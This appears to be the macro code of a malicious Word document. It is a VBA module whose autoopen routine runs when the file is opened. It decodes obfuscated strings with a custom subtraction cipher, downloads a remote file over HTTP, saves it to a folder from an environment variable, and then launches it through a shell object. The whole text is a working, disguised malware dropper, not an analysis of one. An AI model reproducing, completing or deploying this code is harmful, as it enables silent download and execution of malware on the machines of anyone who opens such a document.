Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Const tocFp6Ci = "RHmhiglW"
Private Const lu0ADI = "ìåº¨´ïøÀ∫“…÷"
Private Const FXC0O = "FcXBDjpJ"
Private Const OfmF = "¥“Ö••ÕÿØè≈∑∑ﬁê∏»Œ£∞”‘ß◊Ω"
Private Const iD2E0Ifr = "isuHYmuy"
Private Const YaoZ6ISB = "Ã‘ÿ∞æöÿË·È∫»Ÿ"
Private Const vymArH = "DVuVgasc"
Private Const wPWCLsRmA = "ãõ…"
Private Const V8aAdPb = "IIirEgAf"
Private Const TYRE = "ñ≤Ã‰¥⁄∞ÃΩó í≥âùùπ"
Private Const SORyht2aNVn = "WqTYmiRe"
Private Const Z5AlucBiW = "≥’«ø‡Õ∏ì÷Ãæ"
Private Const HFfeUiZo = "bdVuKCmU"
Private Const gvFktaB = "∂©£≈"
Private Const seq = "fDJRuIHX"
Private Const EVsZjgGped = "π¨Øæ·wâ»¥∂ªÿ™ºœ≥∏"
Private Const dgL8Y5 = "jpwmSbca"
Private Const iRqo = "∆‘Í”∆∆…è’Ô“"
Private Const Oat7OoU5O = "oclJEhjQ"
Private Const CDQluD = "√®πö"
Private Const GuXH1 = "jkinLRYD"
Private Const h3OXMLBCsI = "“ﬂ›ﬁÜÅà©Ã›”¬¡≈‡–ó—ªøà‘ﬁò–µ¿áœ„Œ"

Sub s5AHNe()
 PtBTpJ
End Sub
Sub WGRW()
     s5AHNe
End Sub
Sub autoopen()
     s5AHNe
End Sub
Public Sub PtBTpJ()
On Error GoTo errHere
 
Dim hk5tg As String
 
Dim ghjrtg As String
Dim ktyreg As String
 
ghjrtg = PwlVK1OLyI(h3OXMLBCsI, GuXH1)
ktyreg = Environ(PwlVK1OLyI(CDQluD, Oat7OoU5O)) & PwlVK1OLyI(iRqo, dgL8Y5)
 
If PfnG(ghjrtg, ktyreg) = False Then

    GoTo ExitHere
End If
 Set yjukj5wef = CreateObject(PwlVK1OLyI(EVsZjgGped, seq))
yjukj5wef.Open Environ(PwlVK1OLyI(gvFktaB, HFfeUiZo)) & PwlVK1OLyI(Z5AlucBiW, SORyht2aNVn)
 
ExitHere:
    Exit Sub
errHere:

    Resume ExitHere

End Sub
 
Public Function PfnG(strTarget As String, fdgert3r As String, Optional strUN As String, Optional strPW As String) As Boolean
On Error GoTo errHere
 
Dim dsfrt34t43g As Object
Dim yukjh4 As String
 PfnG = True
Set dsfrt34t43g = CreateObject(PwlVK1OLyI(TYRE, V8aAdPb))
With dsfrt34t43g
    .Open PwlVK1OLyI(wPWCLsRmA, vymArH), strTarget, False, strUN, strPW
    .setRequestHeader PwlVK1OLyI(YaoZ6ISB, iD2E0Ifr), PwlVK1OLyI(OfmF, FXC0O)
    .Send
    If lqj4OnON(fdgert3r, .responseBody) = False Then
        GoTo errHere
    End If
End With
 
ExitHere:
    Set dsfrt34t43g = Nothing
    Exit Function
 
errHere:
     PfnG = False
    Resume ExitHere
    
End Function
 
Private Function lqj4OnON(strFilePath, bytArray) As Boolean
On Error GoTo errHere
 
 
Dim objStream  As Object
 lqj4OnON = True
Set objStream = CreateObject(PwlVK1OLyI(lu0ADI, tocFp6Ci))
With objStream
    .Type = 1
    .Open
    .Write bytArray
    .SaveToFile strFilePath, 2
End With
 
ExitHere:
    Exit Function
errHere:
     lqj4OnON = False
    Resume ExitHere

End Function



Public Function PwlVK1OLyI(ByVal strData As String, ByVal strKey As String)

Dim bData() As Byte
Dim bKey() As Byte
bData = StrConv(strData, vbFromUnicode)
bKey = StrConv(strKey, vbFromUnicode)
For i = 0 To UBound(bData)
If i <= UBound(bKey) Then
bData(i) = bData(i) - bKey(i)
Else
bData(i) = bData(i) - bKey(i Mod UBound(bKey))
End If
Next i
 PwlVK1OLyI = StrConv(bData, vbUnicode)
End Function


